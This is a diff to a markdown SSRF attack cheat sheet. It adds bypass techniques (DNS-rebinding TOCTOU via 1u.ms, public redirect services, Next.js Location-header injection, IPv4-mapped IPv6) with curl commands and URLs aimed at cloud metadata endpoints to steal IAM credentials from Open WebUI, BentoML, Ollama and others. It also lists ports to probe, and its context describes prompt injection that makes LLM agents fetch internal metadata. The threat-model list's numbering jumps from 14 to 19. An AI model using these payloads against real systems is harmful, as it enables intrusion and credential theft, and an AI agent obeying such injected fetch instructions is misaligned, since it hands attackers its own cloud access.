@@ -2146,14 +2146,181 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 
 ---
 
+## DNS Rebinding TOCTOU — Post-Validation Rebinding to Bypass Patched Filters
+
+**Root cause:** SSRF filters that resolve DNS at validation time, then let the HTTP client resolve DNS independently at request time, are vulnerable to a Time-of-Check-Time-of-Use (TOCTOU) race condition. An attacker controls a domain with TTL=0. The validation step resolves it to a public IP (passes the filter); the actual HTTP request re-resolves it — milliseconds later — to an internal IP (127.0.0.1, 169.254.169.254). This is not classic DNS rebinding (for same-origin bypass); it is specifically for bypassing "fixed" SSRF validators that check DNS without pinning the resolved IP for the subsequent request.
+
+**Bypass logic:** Applications that added SSRF fixes using `is_safe_url(url)` → `requests.get(url)` or `socket.gethostbyname(host)` → `urllib.request.urlopen(url)` create this TOCTOU gap — the HTTP client starts a fresh DNS lookup each time. Python's `validators` library, urllib, and common custom validators don't pin the resolved IP between check and use. Affects many projects that added naive "check hostname before request" patches.
+
+**Attack chain:** Submit TTL=0 domain → SSRF filter resolves to public IP (passes) → HTTP client re-resolves to 169.254.169.254 → metadata endpoint → credential theft. Works even against patched implementations.
+
+**Stack:** Craft CMS (CVE-2026-27127), FastGPT (GHSA-cc8x-jrqv-hmwh), AVideo, BentoML (CVE-2025-54381 patch bypass), Postiz (GHSA-f7jj-p389-4w45), ThingsBoard, Open WebUI, Hemmelig (CVE-2025-69206), any Python app using `validators` + `requests`, any app using curl with FOLLOWLOCATION without IP pinning
+
+**Payload:**
+```bash
+# TOCTOU rebinding via 1u.ms (no infrastructure needed):
+# Format: make-SAFE_IP-rebind-INTERNAL_IP-rr.1u.ms
+# First DNS query → SAFE_IP (passes filter), second query → INTERNAL_IP (actual request)
+http://make-1.1.1.1-rebind-169.254-169.254-rr.1u.ms/latest/meta-data/iam/security-credentials/
+
+# GCP metadata via rebinding:
+http://make-1.1.1.1-rebind-169.254-169.254-rr.1u.ms/computeMetadata/v1/instance/service-accounts/default/token
+
+# Vulnerable code pattern to identify (two separate DNS resolutions):
+# VULNERABLE:
+safe = is_safe_url(user_url)           # DNS resolved here → public IP
+if safe: requests.get(user_url)         # DNS resolved AGAIN → internal IP after TTL=0 flip
+
+# ALSO VULNERABLE:
+host = urlparse(user_url).hostname
+if not is_private_ip(socket.gethostbyname(host)):  # resolution 1 → passes
+    urllib.request.urlopen(user_url)                # resolution 2 → internal
+
+# SAFE: pin resolved IP at validation, force HTTP client to use same IP (CURLOPT_RESOLVE)
+```
+
+**Source:** CVE-2026-27127 (Craft CMS TOCTOU), GHSA-cc8x-jrqv-hmwh (FastGPT DNS rebinding TOCTOU), CVE-2025-54381 patch bypass (BentoML, Tenable research Sep 2025), GHSA-f7jj-p389-4w45 (Postiz)
+
+---
+
+## HTTP Redirect Following Bypass (SSRF Filter Doesn't Re-Validate After 3xx)
+
+**Root cause:** SSRF protections validate the URL the user submitted. Many HTTP clients (Python `requests`, `urllib`, curl with `FOLLOWLOCATION=1`) automatically follow 3xx redirects without re-running the SSRF validation on the redirect destination. Attackers provide an initial URL pointing to a public host (passes the filter), which then redirects to an internal IP. The HTTP client silently follows the redirect and fetches the internal service.
+
+**Bypass logic:** `requests.get(url, allow_redirects=True)` (the Python default) follows up to 30 redirects. Each is a new DNS lookup and TCP connection, none validated by the SSRF filter. Using `httpbin.org/redirect-to`, `r3dir.me`, or an attacker-controlled redirect server bypasses even "fully patched" SSRF filters that only check the initial URL. This pattern bypasses patches that added URL validation without disabling redirect following.
+
+**Attack chain:** User-supplied public URL passes filter → HTTP client follows 302 to internal IP → metadata endpoint or internal service → credentials exposed
+
+**Stack:** Open WebUI (GHSA-rh5x-h6pp-cjj6, image-load + web-fetch endpoints), WeasyPrint (GHSA-983w-rhvv-gwmv), pyload (CVE-2026-33992), Hemmelig (CVE-2025-69206), AVideo, any Python app using `requests`/`urllib` with redirect-following enabled; curl with FOLLOWLOCATION=1
+
+**Payload:**
+```http
+# Redirect via public httpbin.org (if not blocked):
+url=http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/
+
+# Redirect via r3dir.me (no infrastructure, looks legitimate):
+url=https://302.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
+url=https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Attacker-controlled redirect server response:
+HTTP/1.1 302 Found
+Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Double-hop bypass (if single redirect is screened):
+# Step 1: target app fetches httpbin.org → 302 to attacker.com
+# Step 2: attacker.com → 302 to http://169.254.169.254/
+url=http://httpbin.org/redirect-to?url=http://attacker.com/step2
+
+# Detection: test if app follows server-side redirects:
+# Submit URL that 302s to YOUR-ID.oast.fun
+# Callback from SERVER IP (not browser IP) = server follows redirects = likely vulnerable
+```
+
+**Source:** GHSA-rh5x-h6pp-cjj6 (Open WebUI redirect bypass), CVE-2026-33992 (pyload patch bypass), GHSA-983w-rhvv-gwmv (WeasyPrint), CVE-2025-69206 (Hemmelig); pattern documented across 2025 advisories
+
+---
+
+## CVE-2025-57822 — Next.js Middleware Location Header SSRF
+
+**Root cause:** In Next.js before 14.2.32 / 15.4.2-canary.43 / 15.4.7, any `Location` header present in a middleware response is treated as a server-side redirect — the Next.js server itself fetches the Location URL, rather than returning it to the browser as an HTTP redirect. Middleware implementations that call `NextResponse.next()` while reflecting user request headers are vulnerable: an attacker injects a `Location: http://INTERNAL_HOST/` header into their HTTP request; the middleware reflects it; Next.js fetches the internal URL server-side.
+
+**Bypass logic:** `Location` is a standard HTTP redirect header. The bug is that Next.js acted on it at the server layer rather than forwarding it to the client. Only affects self-hosted deployments — Vercel's infrastructure blocks this. The attack requires no special privileges. Middleware in Next.js typically applies globally (every route) unless scoped via `matcher`, so the SSRF surface is the entire app.
+
+**Attack chain:** Inject `Location: http://169.254.169.254/latest/meta-data/` header → middleware reflects it via `NextResponse.next()` → Next.js fetches IMDS server-side → credentials in response
+
+**Stack:** Self-hosted Next.js 12.x–15.x before 14.2.32 / 15.4.2-canary.43 / 15.4.7; NOT exploitable on Vercel infrastructure; highest impact on AWS/GCP/Azure-hosted self-hosted deployments
+
+**Payload:**
+```http
+# Inject Location header — hits any route protected by middleware:
+GET /protected-page HTTP/1.1
+Host: target-nextjs.com
+Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP metadata:
+GET / HTTP/1.1
+Host: target-nextjs.com
+Location: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure IMDS:
+Location: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# OOB detection (confirm server-side fetch before targeting metadata):
+Location: http://YOUR-ID.oast.fun/nextjs-middleware-ssrf
+
+# Fingerprint Next.js version (to confirm vulnerable range):
+GET /_next/static/         # reveals Next.js build artifacts
+GET /package.json          # version if exposed
+# X-Powered-By: Next.js header (may be disabled)
+```
+
+**Source:** CVE-2025-57822 (GHSA-4342-x723-ch2f), Invicti Next.js SSRF advisory, miggo.io vulnerability database
+
+---
+
+## AI Platform SSRF — LLM / RAG Infrastructure Endpoints
+
+**Root cause:** AI platforms (Open WebUI, BentoML, Ollama, LangChain-based apps) expose HTTP endpoints that accept user-supplied URLs for core features: RAG web scraping, model pulling from registries, document ingestion, and tool invocations. These endpoints have systematically weak SSRF protections because they are treated as internal features, URL-fetching is a primary function (not a side effect), and developers don't apply standard SSRF scrutiny. Python's `validators` library — the most common validation library in these Python-based platforms — does **not** validate IPv6 private ranges, making `[::ffff:169.254.169.254]` a universal bypass.
+
+**Bypass logic:** Three layers:
+1. `validators` library doesn't block `[::ffff:10.0.0.0/8]` or `[::ffff:169.254.169.254]` — bypasses all AI platform SSRF filters using this library
+2. Redirect following is enabled in underlying HTTP clients — bypasses patched endpoints with a redirect hop
+3. Most endpoints require only basic user authentication (no admin), making the SSRF surface very broad
+
+**Attack chain:** Authenticated API call with internal URL (or IPv6-mapped form) → AI platform fetches URL server-side → IMDS or internal service response → credentials in API response
+
+**Stack:** Open WebUI ≤ 0.6.36 (CVE-2025-65958, `/api/v1/retrieval/process/web`), BentoML 1.4.0–1.4.18 (CVE-2025-54381, multipart/JSON file upload), Ollama ≤ 0.6.4 (`/api/create` endpoint), LangChain-based apps with retrieval tools, AnythingLLM, Flowise
+
+**Payload:**
+```bash
+# Open WebUI — RAG web retrieval endpoint (CVE-2025-65958)
+# Requires: any valid user session (no admin needed)
+curl -X POST http://target:3000/api/v1/retrieval/process/web \
+  -H "Authorization: Bearer USER_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+# IPv4-mapped IPv6 bypass for Python validators library:
+curl -X POST http://target:3000/api/v1/retrieval/process/web \
+  -H "Authorization: Bearer USER_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://[::ffff:169.254.169.254]/latest/meta-data/"}'
+
+# BentoML — file upload URL deserialization (CVE-2025-54381, unauthenticated)
+curl -X POST http://target:3000/infer \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+# Ollama — model creation SSRF (≤ 0.6.4)
+curl -X POST http://target:11434/api/create \
+  -H "Content-Type: application/json" \
+  -d '{"name":"test-model","from":"http://169.254.169.254/latest/meta-data/"}'
+
+# Probe for AI platform endpoints (often no auth for pull/status):
+http://target:3000/api/v1/retrieval/process/web   # Open WebUI RAG
+http://target:11434/api/create                     # Ollama model create
+http://target:11434/api/pull                       # Ollama model pull
+http://target:8000/infer                           # BentoML
+http://target:3001/api/document/upload-link        # AnythingLLM
+http://target:3000/api/v1/documents/web            # Flowise / generic
+
+# Default ports to probe for AI platforms on internal network:
+# 11434 — Ollama
+# 3000  — Open WebUI, Flowise
+# 3001  — AnythingLLM
+# 8000  — BentoML, LiteLLM
+# 1337  — Jan.ai
+```
+
+**Source:** CVE-2025-65958 (Open WebUI GHSA-c6xv-rcvw-v685), CVE-2025-54381 (BentoML), exploit-db.com/52116 (Ollama 0.6.4 SSRF, researcher sud0), GHSA-rh5x-h6pp-cjj6 (Open WebUI redirect bypass), GreyNoise campaign data Oct 2025–Jan 2026
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Updated 2026-05-27.
+> Current patterns as of 2026-Q2. Updated 2026-05-28.
 
-**What's being exploited in the wild (2026-05-27):**
-> Current patterns as of 2026-Q2. Updated 2026-05-26.
-
-**What's being exploited in the wild (2026-05-26):**
+**What's being exploited in the wild (2026-05-28):**
 
 1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
    #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
@@ -2239,41 +2406,69 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
     protocol → `exec://` injection requires no credentials and produces instant RCE. Java
     RMI deserialization via CommonsCollections gadget chains remains viable in unpatched
     enterprise Java middleware.
-15. **Routing-based SSRF via Host/X-Forwarded-Host is under-tested** — Cloud-native
+
+19. **Routing-based SSRF via Host/X-Forwarded-Host is under-tested** — Cloud-native
     microservice stacks route requests by Host header at the load balancer layer. Fuzzing
     the Host header across internal subnet ranges (`192.168.0.§1§`) while watching OOB
     callbacks is now a standard first-pass technique. X-Forwarded-Host is accepted by many
     apps as a Host override, doubling the attack surface.
 
-16. **HTTP/2 pseudo-header SSRF bypasses HTTP/1.1 WAF rules** — Setting `:authority` to
+20. **HTTP/2 pseudo-header SSRF bypasses HTTP/1.1 WAF rules** — Setting `:authority` to
     an internal IP in HTTP/2 requests passes WAFs that only inspect HTTP/1.1 `Host` headers.
     The `:scheme` pseudo-header accepting arbitrary bytes has caused real SSRF in production
     reverse proxy deployments. Test any HTTP/2-capable endpoint with `:authority` set to
     your OOB collaborator.
 
-17. **CVE-2025-61882 (Oracle EBS) is the new Log4Shell for enterprise** — Pre-auth SSRF
+21. **CVE-2025-61882 (Oracle EBS) is the new Log4Shell for enterprise** — Pre-auth SSRF
     chained with CRLF injection and XSLT RCE (CVSS 9.8). Actively exploited by Cl0p
     ransomware since August 2025. Any Oracle EBS 12.2.3–12.2.14 instance is a critical
     target. SSRF in `/OA_HTML/configurator/UiServlet` with CRLF-assisted POST to BI
     Publisher's XSLT engine produces unauthenticated full RCE.
 
-18. **AI agent SSRF is the newest undefended surface** — LLM agents with URL-fetching
+22. **AI agent SSRF is the newest undefended surface** — LLM agents with URL-fetching
     tools are systematically vulnerable to prompt injection in fetched content. Unlike
     traditional SSRF where you bypass a URL filter, here you bypass the LLM's judgment.
     Attackers embed hidden instructions in support tickets, PDFs, or web pages the agent
     processes. Network-level controls (blocking 169.254.169.254 at the tool runner) are
     the only effective mitigation — the LLM cannot be trusted to refuse.
 
-19. **`strings.HasPrefix` / `startsWith` URL allowlist = automatic bypass** — Grafana
+23. **`strings.HasPrefix` / `startsWith` URL allowlist = automatic bypass** — Grafana
     CVE-2025-8341 demonstrated that prefix-based URL allowlisting is systematically
     bypassable with `ALLOWED@INTERNAL_HOST` payloads. Every custom webhook or import-URL
     validator should be audited for this pattern. Code reviewers: search for `HasPrefix`,
     `startsWith`, `str.startswith` applied to full URLs.
 
-20. **SSRF attack volume up 452% (2023–2024)** — Per SonicWall 2025 Cyber Threat Report,
+24. **SSRF attack volume up 452% (2023–2024)** — Per SonicWall 2025 Cyber Threat Report,
     AI-powered scanners are automating SSRF detection at scale. Bug bounty programs are
     seeing dramatically more SSRF submissions. Defenses are not keeping pace: IMDSv1 still
     deployed, allowlists still using prefix matching, Host headers still trusted by proxies.
+
+25. **DNS Rebinding TOCTOU — the new systematic bypass for "patched" SSRF** — Applications
+    that validate DNS at check-time but let HTTP clients re-resolve at request-time are
+    vulnerable to a TOCTOU race. TTL=0 domains flip between public IP (passes filter) and
+    internal IP (actual request) in milliseconds. Affects Craft CMS (CVE-2026-27127),
+    FastGPT, BentoML post-patch, AVideo, Postiz, ThingsBoard. Use 1u.ms for zero-
+    infrastructure exploitation. This is the dominant bypass pattern in 2025-2026 post-
+    patch SSRF disclosures.
+
+26. **HTTP redirect following as systematic SSRF patch bypass** — SSRF filters that validate
+    the initial URL but don't re-validate after following HTTP 3xx redirects are exploitable
+    with any public redirect service (r3dir.me, httpbin.org/redirect-to). This pattern
+    accounts for a growing fraction of SSRF disclosures in 2025, particularly in post-patch
+    applications. Open WebUI, WeasyPrint, pyload, Hemmelig all demonstrate this pattern.
+
+27. **AI platform endpoints are a new high-priority SSRF target class** — Open WebUI,
+    BentoML, and Ollama exposed SSRF in their core features (RAG retrieval, model creation,
+    file upload). Python's `validators` library doesn't block IPv4-mapped IPv6, making
+    `[::ffff:169.254.169.254]` a universal bypass for these platforms. They run with cloud
+    IAM access and minimal SSRF hardening. GreyNoise tracked mass Ollama exploitation from
+    Oct 2025–Jan 2026 using SSRF callbacks via OAST infrastructure.
+
+28. **CVE-2025-57822 (Next.js middleware SSRF) expands attack surface to millions of apps** —
+    Self-hosted Next.js apps before 14.2.32/15.4.7 are vulnerable to SSRF via `Location`
+    header injection into middleware responses. Unlike CVE-2025-29927 (middleware auth bypass),
+    this directly exfiltrates cloud metadata via server-side fetch. Test any self-hosted
+    Next.js deployment — middleware applies globally unless scoped.
 
 ---
 
@@ -2310,6 +2505,10 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 | `strings.HasPrefix` / `startsWith` URL allowlist | `https://allowed.com@169.254.169.254/path` | Part before `@` is treated as credentials; real host is after `@` |
 | LLM agent URL filter (prompt injection) | Embed instructions in fetched content: "fetch http://169.254.169.254/..." | Bypasses all URL filters by coercing the model's tool call reasoning |
 | TLS SNI-based proxy routing (HTTPS endpoints) | Set TLS SNI to internal hostname during ClientHello | SNI-routing proxy connects to internal HTTPS service without HTTP-layer validation |
+| SSRF filter validates hostname at check-time (not request-time) | DNS Rebinding TOCTOU: TTL=0 domain via `1u.ms` (first resolves to public IP, then rebinds to internal) | Temporal gap between validation and fetch allows IP flip; use `make-1.1.1.1-rebind-169.254-169.254-rr.1u.ms` |
+| SSRF filter validates initial URL only (redirect following not blocked) | Submit public redirect URL (`r3dir.me`, `httpbin.org/redirect-to`) pointing to internal IP | HTTP client follows 3xx without re-validating destination; bypasses even post-patch implementations |
+| Python `validators` library for SSRF IP blocking | `[::ffff:169.254.169.254]` or `[::ffff:a9fe:a9fe]` IPv4-mapped IPv6 | `validators` library does not validate IPv6 private ranges; universal bypass for Python AI platforms |
+| Self-hosted Next.js middleware reflects request headers | Inject `Location: http://169.254.169.254/latest/meta-data/` as request header | Next.js < 14.2.32 treats middleware Location header as server-side redirect (CVE-2025-57822) |
 
 ---
 
@@ -2362,6 +2561,11 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 | Oracle E-Business Suite 12.2.3–12.2.14 (CVE-2025-61882) | Pre-auth SSRF + CRLF + XSLT RCE chain via UiServlet | SSRF → RCE as EBS JVM user (CVSS 9.8, Cl0p-exploited) |
 | LLM agents with URL-fetching tools (LangChain, OpenAI Assistants, Claude Tool Use) | Prompt injection in fetched content → agent fetches internal metadata | SSRF → cloud credentials via agent's own tool runner |
 | Grafana Infinity datasource plugin (< 3.4.1, CVE-2025-8341) | `@` bypass in `strings.HasPrefix` allowlist validation | SSRF → internal network access via Grafana server |
+| Open WebUI ≤ 0.6.36 (CVE-2025-65958, `/api/v1/retrieval/process/web`) | Authenticated SSRF in RAG web retrieval; Python `validators` bypass via IPv4-mapped IPv6 | SSRF → IMDS → cloud credentials; internal network enumeration from any user account |
+| BentoML 1.4.0–1.4.18 (CVE-2025-54381, file upload URL fields) | Unauthenticated SSRF via multipart/JSON URL deserialization; DNS rebinding bypasses patch | Cloud metadata → AWS/GCP credentials; internal service access from AI model server |
+| Ollama ≤ 0.6.4 at `127.0.0.1:11434` (`/api/create` endpoint) | SSRF via `from` URL field in model creation; no authentication on default installs | SSRF from any app co-hosted with Ollama; mass exploitation tracked Oct 2025–Jan 2026 |
+| Self-hosted Next.js < 14.2.32 / 15.4.7 (CVE-2025-57822) | `Location` header injection into middleware → server-side fetch | SSRF → cloud IMDS → credentials; affects all routes protected by middleware |
+| Any app with "validate-then-fetch" SSRF filter (DNS TOCTOU) | DNS Rebinding TOCTOU via TTL=0 domain + 1u.ms service | Bypasses post-patch SSRF protections; affects Craft CMS, FastGPT, BentoML patched, AVideo, Postiz |
 
 ---
 
